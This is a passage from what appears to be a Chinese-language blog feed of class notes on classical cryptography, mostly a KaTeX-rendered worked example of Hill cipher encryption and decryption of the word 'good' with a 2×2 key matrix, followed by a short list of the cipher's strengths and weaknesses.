style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><p>因此，good的加密结果是wmwl。显然，明文不同位置的字母“o”加密成的密文字母不同。</p><p>解密变换：由前面计算有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>7</mn><mo separator="true">,</mo><mn>18</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>23</mn><mo separator="true">,</mo><mn>11</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">k^{-1}=\left(\begin{array}{c} 7,18 \\ 23,11 \\ \end{array}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span>，可由密文解密计算出明文，过程如下：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>p</mi><mn>1</mn></msub><msub><mi>p</mi><mn>2</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>c</mi><mn>1</mn></msub><msub><mi>c</mi><mn>2</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>18</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>23</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>11</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>22</mn><mn>12</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>370</mn><mn>638</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>6</mn><mn>14</mn></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mo>⇒</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>g</mi><mi>o</mi></mfrac><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>p</mi><mn>3</mn></msub><msub><mi>p</mi><mn>4</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>c</mi><mn>3</mn></msub><msub><mi>c</mi><mn>4</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>18</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>23</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>11</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>22</mn><mn>11</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>352</mn><mn>627</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>14</mn><mn>3</mn></mfrac><mo fence="true">)</mo></mrow><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo>⇒</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>o</mi><mi>d</mi></mfrac><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}\binom{p_{1}}{p_{2}}=k^{-1}\binom{c_{1}}{c_{2}}=\left(\begin{array}{cc}7 &amp; 18 \\23 &amp; 11\end{array}\right)\binom{22}{12}=\binom{370}{638}=\binom{6}{14}(\bmod 26) \Rightarrow\binom{g}{o} \\\binom{p_{3}}{p_{4}}=k^{-1}\binom{c_{3}}{c_{4}}=\left(\begin{array}{cc}7 &amp; 18 \\23 &amp; 11\end{array}\right)\binom{22}{11}=\binom{352}{627}=\binom{14}{3} \bmod 26 \Rightarrow\binom{o}{d}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.80006em;vertical-align:-2.15003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65003em;"><span style="top:-4.65003em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.355em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">3</span><span class="mord mtight">8</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">7</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7453919999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.355em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">5</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7453919999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><p>因此，解密得到正确的密文“good”。</p><h4 id="特点-2"><a class="markdownIt-Anchor" href="#特点-2"></a> 特点</h4><ul><li>可以较好地抑制自然语言的统计特性，不再有单字母替换的一一对应关系，对抗“唯密文攻击”有较高安全强度。</li><li>密钥空间较大，在忽略密钥矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>可逆限制条件下，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>k</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mn>2</mn><msup><mn>6</mn><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow></msup></mrow><annotation encoding="application/x-tex">|k|=26^{n×n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></li><li>易受已知明文攻击及选择明文攻击</li></ul><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/101268797_p0.jpg" alt="101268797_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 古典密码 </tag>
            
            <tag> 仿射密码 </tag>
            
            <tag> Hill Cipher </tag>
            
            <tag> Vigenere Cipher </tag>
            
            <tag> Playfair Cipher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法笔记之复杂性理论</title>
      <link href="/posts/f4c69437cf30/"/>
